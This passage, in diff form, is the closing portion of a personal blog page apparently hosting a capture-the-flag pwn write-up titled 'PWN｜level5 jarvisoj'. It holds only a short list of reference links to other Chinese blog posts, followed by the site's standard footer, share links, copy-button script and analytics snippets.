+<h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h6><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/github_36788573/article/details/80178146">https://blog.csdn.net/github_36788573/article/details/80178146</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41617275/article/details/84955439">https://blog.csdn.net/weixin_41617275/article/details/84955439</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/12398759.html">https://www.cnblogs.com/luoleqi/p/12398759.html</a><br>（这个博主用的另外一种方法，省去了很多步骤）</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&text=PWN｜level5 jarvisoj"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&title=PWN｜level5 jarvisoj"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&is_video=false&description=PWN｜level5 jarvisoj"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PWN｜level5 jarvisoj&body=Check out this article: http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&title=PWN｜level5 jarvisoj"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&title=PWN｜level5 jarvisoj"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&title=PWN｜level5 jarvisoj"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&title=PWN｜level5 jarvisoj"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&name=PWN｜level5 jarvisoj&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&t=PWN｜level5 jarvisoj"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Elli0t
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-49627206-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-49627206-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4cc1f2d8f3067386cc5cdb626a202900";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
